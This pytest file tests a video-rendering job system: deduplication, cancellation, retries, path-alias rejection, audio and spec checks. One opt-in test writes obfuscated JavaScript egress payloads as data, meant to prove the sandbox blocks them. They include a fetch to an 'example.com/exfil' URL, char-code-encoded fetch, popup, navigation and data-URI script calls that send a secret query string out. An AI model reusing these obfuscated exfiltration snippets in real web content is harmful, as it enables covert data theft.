"""Durable rendering contracts; every artifact is isolated by pytest."""
from copy import deepcopy
import os
from pathlib import Path
import shutil

import pytest

from scripts.channel_store import ChannelError
from scripts.hyperframes_authoring import freeze_dependencies
from scripts.hyperframes_render import HyperFramesRenderJobs


@pytest.fixture(autouse=True)
def remove_generated_media(tmp_path):
    yield
    for path in tmp_path.rglob("*"):
        if path.is_file() and path.suffix.lower() in {".mp4", ".webp", ".png"}:
            path.unlink()
    # All source/revision/staging fixtures belong exclusively to this test.
    fixture_root = tmp_path.resolve()
    for name in (".tmp", "03_Projects", "composition"):
        owned = (fixture_root / name).resolve()
        if owned.is_relative_to(fixture_root) and owned.is_dir():
            shutil.rmtree(owned)


def fixture(root):
    source = root / ".tmp/source"
    source.mkdir(parents=True)
    (source / "index.html").write_text('<html><body><div data-duration="1">Frame</div></body></html>', encoding="utf-8")
    snapshot = freeze_dependencies(source, root / "03_Projects/revisions/one")
    snapshot.update(id="rev_one", project_id="project", channel_id="main")
    project = {"project_id": "project", "project_name": "main/HF_project", "channel_id": "main", "revision": 1,
               "source_binding": {"type": "standalone"}, "channel_identity": {"channel_id": "main"},
               "inputs": {"audio_mode": "silent", "duration_seconds": 1}}
    return project, snapshot


def store(root, runner=None, specs=None, thumbnailer=None):
    specs = specs or {"width": 1080, "height": 1920, "fps": 30, "duration": 1, "audio": False}
    def render(job, directory, entry, target):
        target.write_bytes(b"unit-render-result")
    def thumbnail(video, destination, duration):
        from PIL import Image
        Image.new("RGB", (16, 16), "white").save(destination, "WEBP")
    return HyperFramesRenderJobs(root, runner=runner or render, probe=lambda path: deepcopy(specs), thumbnailer=thumbnailer or thumbnail)


def test_request_dedupes_across_instances_and_owner(tmp_path):
    project, snapshot = fixture(tmp_path)
    first = store(tmp_path).create("main", project, snapshot, idempotency_key="request")
    second = store(tmp_path).create("main", project, snapshot, idempotency_key="request")
    assert second["id"] == first["id"]
    project["revision"] += 1
    with pytest.raises(ChannelError) as error:
        store(tmp_path).create("main", project, snapshot, idempotency_key="request")
    assert error.value.code == "hyperframes_request_conflict"
    with pytest.raises(ChannelError):
        store(tmp_path).get("second", first["id"])


def test_closed_snapshot_renders_in_disposable_copy_and_no_registry(tmp_path):
    project, snapshot = fixture(tmp_path)
    def render(job, directory, entry, target):
        assert directory != Path(snapshot["revision_dir"])
        (directory / "cli-cache.txt").write_text("temporary")
        target.write_bytes(b"result")
    jobs = store(tmp_path, runner=render)
    job = jobs.create("main", project, snapshot, idempotency_key="request")
    result = jobs.execute("main", job["id"])
    assert result["status"] == "qc_ready"
    assert result["artifact"]["composition_revision"] == "rev_one"
    assert (tmp_path / result["artifact"]["thumbnail_path"]).exists()
    assert not (Path(snapshot["revision_dir"]) / "cli-cache.txt").exists()
    assert not (tmp_path / "_Docs/export_registry.json").exists()
    assert not (tmp_path / "04_Exports").exists()


def test_edit_accepted_dependency_before_execution_blocks_runner(tmp_path):
    project, snapshot = fixture(tmp_path)
    called = []
    jobs = store(tmp_path, runner=lambda *args: called.append(True))
    job = jobs.create("main", project, snapshot, idempotency_key="request")
    (Path(snapshot["revision_dir"]) / "index.html").write_text("changed")
    result = jobs.execute("main", job["id"])
    assert result["status"] == "failed" and not called
    assert result["artifact"] is None


@pytest.mark.parametrize("wrong", [{"fps": 60}, {"width": 1920}, {"height": 1080}, {"duration": 0}, {"duration": 2}])
def test_invalid_measured_video_never_becomes_qc_ready(tmp_path, wrong):
    project, snapshot = fixture(tmp_path)
    specs = {"width": 1080, "height": 1920, "fps": 30, "duration": 1, "audio": False, **wrong}
    jobs = store(tmp_path, specs=specs)
    result = jobs.execute("main", jobs.create("main", project, snapshot, idempotency_key="request")["id"])
    assert result["status"] == "failed" and result["artifact"] is None


def test_declared_narration_requires_audio(tmp_path):
    project, snapshot = fixture(tmp_path)
    project["inputs"]["audio_mode"] = "narration"
    jobs = store(tmp_path)
    result = jobs.execute("main", jobs.create("main", project, snapshot, idempotency_key="request")["id"])
    assert result["status"] == "failed" and "audio" in result["error"]


def test_missing_thumbnail_is_failed(tmp_path):
    project, snapshot = fixture(tmp_path)
    jobs = store(tmp_path, thumbnailer=lambda *args: None)
    result = jobs.execute("main", jobs.create("main", project, snapshot, idempotency_key="request")["id"])
    assert result["status"] == "failed" and result["artifact"] is None


def test_cancel_during_render_and_restart_retry_retains_input(tmp_path):
    project, snapshot = fixture(tmp_path)
    jobs = store(tmp_path)
    def cancel(job, directory, entry, target):
        jobs.cancel("main", job["id"])
        target.write_bytes(b"partial")
    jobs.runner = cancel
    job = jobs.create("main", project, snapshot, idempotency_key="request")
    assert jobs.execute("main", job["id"])["status"] == "cancelled"
    other = jobs.create("main", project, snapshot, idempotency_key="other")
    jobs._change("main", other["id"], lambda row: row.update(status="rendering", executor_pid=999999))
    reopened = store(tmp_path)
    assert reopened.recover_interrupted("main", alive=lambda pid: False) == [other["id"]]
    assert reopened.queue_retry("main", other["id"])["status"] == "queued"
    retried = reopened.execute("main", other["id"])
    assert retried["status"] == "qc_ready" and retried["input_hash"] == other["input_hash"]


def test_product_render_requires_frozen_source_angle(tmp_path):
    project, snapshot = fixture(tmp_path)
    project["source_binding"] = {"type": "product_angle", "product_id": "p", "angle_id": "a"}
    jobs = store(tmp_path)
    with pytest.raises(ChannelError) as error:
        jobs.create("main", project, snapshot, idempotency_key="request")
    assert error.value.code == "hyperframes_source_revision_missing"
    row = jobs.create("main", project, snapshot, idempotency_key="request", source_angle_snapshot={"angle_id": "a", "script": "original"})
    assert row["source_angle_snapshot"]["script"] == "original"


def test_default_recovery_does_not_interrupt_a_live_process(tmp_path):
    from scripts.hyperframes_render import _process_identity
    project, snapshot = fixture(tmp_path)
    jobs = store(tmp_path)
    job = jobs.create("main", project, snapshot, idempotency_key="live")
    jobs._change("main", job["id"], lambda row: row.update(status="rendering", executor_pid=os.getpid(),
                 executor_creation=_process_identity(os.getpid())))
    assert jobs.recover_interrupted("main") == []
    assert jobs.get("main", job["id"])["status"] == "rendering"


def test_revision_directory_preferred_over_snapshot_manifest_file(tmp_path):
    project, snapshot = fixture(tmp_path)
    snapshot["snapshot_path"] = str(Path(snapshot["revision_dir"]) / "snapshot.json")
    jobs = store(tmp_path)
    row = jobs.create("main", project, snapshot, idempotency_key="manifest-path")
    assert row["snapshot"]["revision_path"] == "03_Projects/revisions/one"
    assert jobs.execute("main", row["id"])["status"] == "qc_ready"


def test_snapshot_file_fallback_resolves_its_parent(tmp_path):
    project, snapshot = fixture(tmp_path)
    snapshot["snapshot_path"] = str(Path(snapshot.pop("revision_dir")) / "snapshot.json")
    jobs = store(tmp_path)
    assert jobs.create("main", project, snapshot, idempotency_key="manifest-only")["snapshot"]["revision_path"] == "03_Projects/revisions/one"


def test_sdk_worker_receives_exact_snapshot_and_never_runs_cli_check(tmp_path, monkeypatch):
    import scripts.hyperframes_render as module
    commands = []
    class Process:
        returncode = 0
        def poll(self):
            return 0
    def spawn(command, **kwargs):
        commands.append((command, kwargs))
        return Process()
    jobs = store(tmp_path)
    monkeypatch.setattr(module.shutil, "which", lambda name: "node")
    monkeypatch.setattr(module.subprocess, "Popen", spawn)
    monkeypatch.setattr(jobs, "get", lambda *args: {"executor_token": "token", "cancel_requested": False})
    root = tmp_path / "composition"
    root.mkdir()
    jobs._run_sdk({"cli_version": "0.8.143", "id": "job", "channel_id": "main", "executor_token": "token",
                   "snapshot": {"files": [{"path": "index.html", "sha256": "frozen"}]},
                   "inputs": {"duration_seconds": 1, "audio_mode": "silent"}},
                  root, root / "index.html", tmp_path / "video.mp4")
    assert len(commands) == 1
    assert commands[0][0][0] == "node"
    assert Path(commands[0][0][1]).name == "hyperframes_render_worker.mjs"
    import json
    request = json.loads((tmp_path / "worker-input.json").read_text(encoding="utf-8"))
    assert request["files"] == [{"path": "index.html", "sha256": "frozen"}]
    assert request["audio_mode"] == "silent" and request["duration_seconds"] == 1


def test_render_pins_accepted_audio_hash_even_when_saved_asset_changes(tmp_path):
    project, snapshot = fixture(tmp_path)
    project["inputs"].update(audio_mode="narration", voiceover_path=".tmp/voice.wav")
    (tmp_path / ".tmp/voice.wav").write_bytes(b"changed after submit")
    snapshot["asset_hashes"] = {"voiceover_path": "original-accepted-hash"}
    job = store(tmp_path).create("main", project, snapshot, idempotency_key="audio-pin")
    assert job["asset_contract"] == {"required_audio": [{"role": "voiceover", "sha256": "original-accepted-hash"}]}
    snapshot["asset_hashes"]["voiceover_path"] = "mutated"
    assert job["snapshot"]["asset_hashes"]["voiceover_path"] == "original-accepted-hash"


def test_render_rejects_managed_stage_alias_into_raw(tmp_path):
    raw = tmp_path / "01_Raw"
    raw.mkdir()
    alias = tmp_path / ".tmp"
    try:
        alias.symlink_to(raw, target_is_directory=True)
    except OSError:
        if os.name != "nt":
            pytest.skip("Symlinks unavailable")
        import subprocess
        result = subprocess.run(["cmd", "/c", "mklink", "/J", str(alias), str(raw)], capture_output=True)
        if result.returncode:
            pytest.skip("Junction creation unavailable")
    try:
        with pytest.raises(ChannelError) as error:
            store(tmp_path)._path(".tmp/hyperframes/render/job/1")
        assert error.value.code == "hyperframes_path_alias"
        assert not list(raw.iterdir())
    finally:
        # Remove only the alias itself; the target is never traversed/deleted.
        if alias.is_symlink():
            alias.unlink()
        else:
            alias.rmdir()


@pytest.mark.skipif(os.environ.get("OMNICUT_HF_REAL_RENDER_SMOKE") != "1", reason="Explicit worker preflight opt-in")
@pytest.mark.parametrize("track", ["absent", "muted", "different_hash", "group_muted", "automation_muted"])
def test_actual_worker_rejects_saved_audio_that_is_not_mixed(tmp_path, track):
    import hashlib
    import json
    import subprocess
    composition = tmp_path / "composition"
    composition.mkdir()
    voice = b"required saved asset"
    other = b"different track"
    (composition / "voice.wav").write_bytes(voice)
    (composition / "other.wav").write_bytes(other)
    audio = "" if track == "absent" else '<audio id="voice" src="' + ("other.wav" if track == "different_hash" else "voice.wav") + '" data-start="0" data-duration="1" data-volume="' + ("0" if track == "muted" else "1") + '"></audio>'
    if track == "group_muted":
        audio = '<hf-audio-group id="bus" data-volume="0"></hf-audio-group>' + audio.replace('id="voice"', 'id="voice" data-audio-group="bus"')
    if track == "automation_muted":
        audio = audio.replace('data-start="0"', 'data-start="0" data-automation=\'{"volume":[{"time":0,"value":0},{"time":1,"value":0}]}\'')
    html = '<html><body><div data-composition-id="reject" data-no-timeline data-duration="1"></div>' + audio + '</body></html>'
    (composition / "index.html").write_text(html, encoding="utf-8")
    spec = {"project_dir": str(composition), "output_path": str(tmp_path / "video.mp4"), "entrypoint": "index.html",
            "duration_seconds": 1, "audio_mode": "narration",
            "asset_contract": {"required_audio": [{"role": "voiceover", "sha256": hashlib.sha256(voice).hexdigest()}]},
            "files": [{"path": file.name, "sha256": hashlib.sha256(file.read_bytes()).hexdigest()} for file in composition.iterdir()]}
    request = tmp_path / "worker-input.json"
    request.write_text(json.dumps(spec), encoding="utf-8")
    worker = Path(__file__).resolve().parents[1] / "tools/hyperframes_render_worker.mjs"
    result = subprocess.run([shutil.which("node"), str(worker), str(request)], capture_output=True, text=True, timeout=20)
    assert result.returncode != 0
    expected_error = ("requires an authored local audio track" if track == "absent" else
                      "hyperframes_audio_processing_unsupported" if track == "automation_muted" else "hyperframes_audio_asset_unused")
    assert expected_error in result.stderr, result.stdout + result.stderr
    assert not (tmp_path / "video.mp4").exists()


def test_uncheckable_custom_entry_fails_with_actionable_error(tmp_path):
    with pytest.raises(ChannelError) as error:
        store(tmp_path)._run_cli({}, tmp_path, tmp_path / "custom.html", tmp_path / "video.mp4")
    assert error.value.code == "hyperframes_check_entry_unsupported"


def test_unconfirmed_stop_cannot_report_cancelled(tmp_path):
    from scripts.hyperframes_render import _CLIStopError
    project, snapshot = fixture(tmp_path)
    jobs = store(tmp_path)
    def failed_stop(job, *args):
        jobs.cancel("main", job["id"])
        raise _CLIStopError("renderer is still alive")
    jobs.runner = failed_stop
    job = jobs.create("main", project, snapshot, idempotency_key="stop-failed")
    result = jobs.execute("main", job["id"])
    assert result["status"] == "interrupted"
    assert result["cancel_requested"]
    assert result["artifact"] is None
    with pytest.raises(ChannelError) as error:
        jobs.queue_retry("main", job["id"])
    assert error.value.code == "hyperframes_worker_active"


def test_failed_retry_is_queued_before_background_work_and_keeps_exact_inputs(tmp_path):
    project, snapshot = fixture(tmp_path)
    jobs = store(tmp_path, runner=lambda *args: (_ for _ in ()).throw(ValueError("first attempt failed")))
    created = jobs.create("main", project, snapshot, idempotency_key="retry")
    failed = jobs.execute("main", created["id"])
    assert failed["status"] == "failed"
    with pytest.raises(ChannelError):
        jobs.execute("main", created["id"])
    queued = jobs.queue_retry("main", created["id"])
    assert queued["status"] == "queued" and queued["revision"] == failed["revision"] + 1
    assert queued["input_hash"] == created["input_hash"]
    assert queued["snapshot"] == created["snapshot"]
    assert queued["attempt"] == 1 and queued["error"] is None
    assert "executor_token" not in queued
    reopened = store(tmp_path)
    completed = reopened.execute("main", created["id"])
    assert completed["status"] == "qc_ready" and completed["attempt"] == 2


def test_failed_job_with_live_cli_handle_cannot_be_requeued(tmp_path):
    import scripts.hyperframes_render as module
    project, snapshot = fixture(tmp_path)
    jobs = store(tmp_path)
    row = jobs.create("main", project, snapshot, idempotency_key="live-handle")
    jobs._change("main", row["id"], lambda data: data.update(status="failed"))
    key = (str(jobs.root), row["id"])
    module._processes[key] = type("Handle", (), {"poll": lambda self: None})()
    try:
        with pytest.raises(ChannelError) as error:
            jobs.queue_retry("main", row["id"])
        assert error.value.code == "hyperframes_worker_active"
        assert jobs.get("main", row["id"])["status"] == "failed"
    finally:
        module._processes.pop(key)


@pytest.mark.skipif(os.name != "nt", reason="Windows owned subtree cancellation")
def test_windows_cancel_targets_only_current_job_subtree(tmp_path, monkeypatch):
    import scripts.hyperframes_render as module
    calls = []
    class Process:
        pid = 54321
        returncode = None
        def poll(self):
            return self.returncode
        def wait(self, **kwargs):
            return self.returncode
    process = Process()
    jobs = store(tmp_path)
    def stop(command, **kwargs):
        calls.append(command)
        process.returncode = -1
        return type("Result", (), {"returncode": 0})()
    monkeypatch.setattr(module.subprocess, "run", stop)
    monkeypatch.setattr(module.subprocess, "Popen", lambda *args, **kwargs: process)
    monkeypatch.setattr(module.shutil, "which", lambda *args: "npx.cmd")
    observed = iter([False, True])
    monkeypatch.setattr(jobs, "get", lambda *args: {"executor_token": "t", "cancel_requested": next(observed)})
    foreign_key = (str(jobs.root), "foreign-job")
    foreign = object()
    module._processes[foreign_key] = foreign
    try:
        with pytest.raises(RuntimeError, match="cancelled"):
            jobs._run_cli({"cli_version": "0.8.143", "id": "current-job", "channel_id": "main", "executor_token": "t",
                           "snapshot": {"files": []}, "inputs": {"duration_seconds": 1}},
                          tmp_path, tmp_path / "index.html", tmp_path / "video.mp4")
        assert calls == [["taskkill", "/PID", "54321", "/T", "/F"]]
        assert module._processes[foreign_key] is foreign
        assert (str(jobs.root), "current-job") not in module._processes
    finally:
        module._processes.pop(foreign_key)


def test_reused_process_id_is_interrupted_even_when_pid_is_live(tmp_path):
    project, snapshot = fixture(tmp_path)
    jobs = store(tmp_path)
    job = jobs.create("main", project, snapshot, idempotency_key="recycled")
    jobs._change("main", job["id"], lambda row: row.update(status="rendering", executor_pid=os.getpid(),
                 executor_creation="not-the-current-process"))
    assert jobs.recover_interrupted("main") == [job["id"]]


@pytest.mark.skipif(os.name != "nt", reason="Windows recovery contract")
def test_windows_recovery_never_calls_os_kill(tmp_path, monkeypatch):
    def forbidden(*args):
        pytest.fail("Windows process liveness must never call os.kill")
    monkeypatch.setattr(os, "kill", forbidden)
    project, snapshot = fixture(tmp_path)
    jobs = store(tmp_path)
    job = jobs.create("main", project, snapshot, idempotency_key="dead")
    jobs._change("main", job["id"], lambda row: row.update(status="rendering", executor_pid=2147483647))
    assert jobs.recover_interrupted("main") == [job["id"]]


def test_staging_directory_failure_becomes_failed_not_stuck_rendering(tmp_path, monkeypatch):
    project, snapshot = fixture(tmp_path)
    jobs = store(tmp_path)
    job = jobs.create("main", project, snapshot, idempotency_key="permission")
    original = Path.mkdir
    def fail(path, *args, **kwargs):
        if "render" in path.parts:
            raise PermissionError("staging denied")
        return original(path, *args, **kwargs)
    monkeypatch.setattr(Path, "mkdir", fail)
    result = jobs.execute("main", job["id"])
    assert result["status"] == "failed" and "staging denied" in result["error"]


def test_dependency_changed_during_copy_is_rejected_before_runner(tmp_path, monkeypatch):
    import scripts.hyperframes_render as module
    project, snapshot = fixture(tmp_path)
    called = []
    jobs = store(tmp_path, runner=lambda *args: called.append(True))
    job = jobs.create("main", project, snapshot, idempotency_key="race")
    original = module.shutil.copy2
    def corrupt(source, destination):
        original(source, destination)
        Path(destination).write_text("changed during copy")
    monkeypatch.setattr(module.shutil, "copy2", corrupt)
    result = jobs.execute("main", job["id"])
    assert result["status"] == "failed" and not called


@pytest.mark.parametrize("wrong", [{"fps": float("nan")}, {"duration": float("nan")}, {"duration": float("inf")}])
def test_nonfinite_measured_video_is_rejected(tmp_path, wrong):
    project, snapshot = fixture(tmp_path)
    specs = {"width": 1080, "height": 1920, "fps": 30, "duration": 1, "audio": False, **wrong}
    jobs = store(tmp_path, specs=specs)
    result = jobs.execute("main", jobs.create("main", project, snapshot, idempotency_key="nan")["id"])
    assert result["status"] == "failed"


@pytest.mark.skipif(os.environ.get("OMNICUT_HF_REAL_RENDER_SMOKE") != "1", reason="Explicit real SDK smoke opt-in")
@pytest.mark.parametrize("audio_mode", ["silent", "narration", "music_only", "video"])
def test_actual_pinned_sdk_render_and_thumbnail(tmp_path, audio_mode):
    """No CDN/assets, text/font changes, production registry, or real exports.

    A native seekable animation exercises runtime capture and the real encoder.
    All media are removed even on a failed assertion; default tests stay offline.
    """
    source = tmp_path / ".tmp/source"
    source.mkdir(parents=True)
    source.joinpath("index.html").write_text('''<!doctype html><html><head><meta charset="utf-8">
<style>html,body{margin:0;width:100%;height:100%;background:#081521}#root{position:relative;width:100%;height:100%;overflow:hidden}
.clip{position:absolute;inset:0}#orb{position:absolute;left:340px;top:700px;width:400px;height:400px;border-radius:50%;background:#66ff00}</style>
</head><body><div id="root" data-composition-id="smoke" data-no-timeline data-start="0" data-width="1080" data-height="1920" data-duration="1">
<section id="scene" class="clip" data-start="0" data-duration="1"><div id="orb"></div></section></div>
<script>const motion=document.getElementById('orb').animate([{transform:'translateX(-120px)'},{transform:'translateX(120px)'}],{duration:1000,fill:'both',iterations:1});motion.pause();</script>
</body></html>''', encoding="utf-8")
    video_mode = audio_mode == "video"
    if video_mode:
        import subprocess
        subprocess.run([shutil.which("ffmpeg"), "-v", "error", "-f", "lavfi", "-i", "color=c=0x66ff00:s=1080x1920:r=30:d=1", "-an", "-c:v", "libx264", "-pix_fmt", "yuv420p", str(source / "clip.mp4")], check=True, timeout=30)
        html = (source / "index.html").read_text(encoding="utf-8")
        (source / "index.html").write_text(html.replace('<div id="orb"></div>', '<video id="footage" src="clip.mp4" data-start="0" data-duration="1" style="position:absolute;left:340px;top:700px;width:400px;height:400px"></video>'), encoding="utf-8")
        # Keep seekable animation on a separate inert node.
        (source / "index.html").write_text((source / "index.html").read_text(encoding="utf-8").replace("const motion=", "document.querySelector('section').insertAdjacentHTML('beforeend','<div id=\"orb\" style=\"display:none\"></div>');const motion="), encoding="utf-8")
        audio_mode = "silent"
    if audio_mode != "silent":
        import wave
        import math
        import struct
        with wave.open(str(source / "voice.wav"), "wb") as wav:
            wav.setparams((1, 2, 22050, 22050, "NONE", "not compressed"))
            wav.writeframes(b"".join(struct.pack("<h", int(1000 * math.sin(2 * math.pi * 440 * t / 22050))) for t in range(22050)))
        html = (source / "index.html").read_text(encoding="utf-8")
        (source / "index.html").write_text(html.replace("</body>", '<audio id="voice" src="voice.wav" data-start="0" data-duration="1" data-volume="0.2"></audio></body>'), encoding="utf-8")
    snapshot = freeze_dependencies(source, tmp_path / "03_Projects/revisions/smoke")
    snapshot.update(id="rev_smoke", project_id="project", channel_id="main")
    project = {"project_id": "project", "project_name": "main/HF_project", "channel_id": "main", "revision": 1,
               "source_binding": {"type": "standalone"}, "channel_identity": {"channel_id": "main"},
               "inputs": {"audio_mode": audio_mode, "duration_seconds": 1}}
    if audio_mode != "silent":
        project["inputs"]["voiceover_path" if audio_mode == "narration" else "music_path"] = ".tmp/source/voice.wav"
    jobs = HyperFramesRenderJobs(tmp_path)
    job = jobs.create("main", project, snapshot, idempotency_key="real-smoke")
    try:
        result = jobs.execute("main", job["id"])
        if result["status"] != "qc_ready":
            log = tmp_path / f".tmp/hyperframes/render/{job['id']}/1/render.log"
            pytest.fail(f"{result.get('error')}\n{log.read_text(encoding='utf-8', errors='replace')[-8000:] if log.exists() else 'no CLI log'}")
        specs = result["artifact"]["specs"]
        assert specs["width"] == 1080 and specs["height"] == 1920
        assert specs["fps"] == 30 and abs(specs["duration"] - 1) < .1
        assert bool(specs["audio"]) == (audio_mode != "silent")
        if audio_mode != "silent":
            import array
            import subprocess
            decoded = subprocess.run([shutil.which("ffmpeg"), "-v", "error", "-i", str(tmp_path / result["artifact"]["path"]),
                                      "-vn", "-f", "s16le", "-ac", "1", "pipe:1"], capture_output=True, check=True, timeout=20)
            samples = array.array("h")
            samples.frombytes(decoded.stdout)
            assert samples and max(abs(value) for value in samples) > 50
        from PIL import Image
        with Image.open(tmp_path / result["artifact"]["thumbnail_path"]) as image:
            assert image.size == (1080, 1920)
            assert max(image.convert("RGB").getchannel("G").getextrema()) > 240
            assert min(image.convert("RGB").getchannel("G").getextrema()) < 30
        assert not (tmp_path / "04_Exports").exists()
    finally:
        for path in tmp_path.rglob("*"):
            if path.is_file() and path.suffix.lower() in {".mp4", ".webp", ".png"}:
                path.unlink()


@pytest.mark.skipif(os.environ.get("OMNICUT_HF_REAL_RENDER_SMOKE") != "1", reason="Explicit guarded browser smoke opt-in")
@pytest.mark.parametrize("attempt", ["fetch", "popup", "navigation", "data_script"])
def test_actual_worker_blocks_obfuscated_network_before_any_server_hit(tmp_path, attempt):
    """Bypass authoring lint deliberately: the runtime itself must deny egress."""
    import hashlib
    import json
    import subprocess
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    hits = []
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            hits.append(self.path)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"must never be read")
        def log_message(self, *_args):
            pass
    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    composition = tmp_path / "composition"
    composition.mkdir()
    endpoint = f"http://127.0.0.1:{server.server_port}/api/production?secret=fixture"
    encoded = ",".join(str(ord(c)) for c in endpoint)
    expression = f"String.fromCharCode({encoded})"
    if attempt == "fetch":
        code = f"window.__omnicutBlocked=()=>Promise.resolve();window.addEventListener('securitypolicyviolation',e=>e.stopImmediatePropagation(),true);window['fet'+'ch']({expression}).catch(()=>{{}});window['fet'+'ch'](['https:', '', 'example.com', 'exfil'].join('/')).catch(()=>{{}});"
    elif attempt == "popup":
        code = f"window['op'+'en']({expression});"
    elif attempt == "navigation":
        code = f"location.assign({expression});"
    else:
        code = f"const s=document.createElement('script');s.src='data:text/javascript,'+encodeURIComponent('fetch('+JSON.stringify({expression})+')');document.head.appendChild(s);"
    html = '<!doctype html><html><head><meta charset="utf-8"></head><body><div data-composition-id="negative" data-no-timeline data-duration="1" data-width="1080" data-height="1920"></div><script>' + code + '</script></body></html>'
    (composition / "index.html").write_text(html, encoding="utf-8")
    spec = {"project_dir": str(composition), "output_path": str(tmp_path / "video.mp4"),
            "entrypoint": "index.html", "duration_seconds": 1, "audio_mode": "silent",
            "files": [{"path": "index.html", "sha256": hashlib.sha256(html.encode()).hexdigest()}]}
    request = tmp_path / "worker-input.json"
    request.write_text(json.dumps(spec), encoding="utf-8")
    worker = Path(__file__).resolve().parents[1] / "tools/hyperframes_render_worker.mjs"
    try:
        result = subprocess.run([shutil.which("node"), str(worker), str(request)], capture_output=True, text=True, timeout=45)
        assert result.returncode != 0, result.stdout + result.stderr
        audit = json.loads((tmp_path / "network-audit.json").read_text(encoding="utf-8"))
        assert audit["blocked"] and not audit["completed"]
        if attempt in {"fetch", "data_script"}:
            assert any(row["kind"].startswith("cdp-csp:") for row in audit["blocked"])
        assert hits == []
        assert "secret=fixture" not in json.dumps(audit)
        assert not (tmp_path / "video.mp4").exists()
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=2)


@pytest.mark.skipif(os.environ.get("OMNICUT_HF_REAL_RENDER_SMOKE") != "1", reason="Explicit nested visual SDK smoke opt-in")
def test_actual_sdk_template_subcomposition_visual_mount(tmp_path):
    """Prove native data-composition-src template mounting under the guard."""
    source = tmp_path / ".tmp/source"
    child_dir = source / "compositions"
    child_dir.mkdir(parents=True)
    (source / "index.html").write_text('''<!doctype html><html><head><style>
html,body{margin:0;background:#081521}#root{position:relative;width:1080px;height:1920px}
#slot{position:absolute;inset:0}</style></head><body>
<div id="root" data-composition-id="root" data-no-timeline data-width="1080" data-height="1920" data-duration="1">
<div id="slot" class="clip" data-composition-id="child" data-no-timeline data-composition-src="compositions/child.html"
 data-start="0" data-duration="1" data-width="1080" data-height="1920" data-track-index="1"></div></div></body></html>''', encoding="utf-8")
    (child_dir / "child.html").write_text('''<!doctype html><html><body><template>
<style>#child{position:absolute;inset:0}#nested-orb{position:absolute;left:340px;top:700px;width:400px;height:400px;border-radius:50%;background:#66ff00}</style>
<div id="child" data-composition-id="child" data-no-timeline data-duration="1" data-width="1080" data-height="1920"><div id="nested-orb"></div></div>
</template></body></html>''', encoding="utf-8")
    snapshot = freeze_dependencies(source, tmp_path / "03_Projects/revisions/nested")
    snapshot.update(id="rev_nested", project_id="project", channel_id="main")
    project = {"project_id": "project", "project_name": "main/HF_project", "channel_id": "main", "revision": 1,
               "source_binding": {"type": "standalone"}, "channel_identity": {"channel_id": "main"},
               "inputs": {"audio_mode": "silent", "duration_seconds": 1}}
    jobs = HyperFramesRenderJobs(tmp_path)
    job = jobs.create("main", project, snapshot, idempotency_key="nested-visual-smoke")
    result = jobs.execute("main", job["id"])
    if result["status"] != "qc_ready":
        log = tmp_path / f".tmp/hyperframes/render/{job['id']}/1/render.log"
        pytest.fail(f"{result.get('error')}\n{log.read_text(encoding='utf-8', errors='replace')[-8000:]}")
    from PIL import Image
    with Image.open(tmp_path / result["artifact"]["thumbnail_path"]) as image:
        assert image.size == (1080, 1920)
        assert max(image.convert("RGB").getchannel("G").getextrema()) > 240
        assert min(image.convert("RGB").getchannel("G").getextrema()) < 30
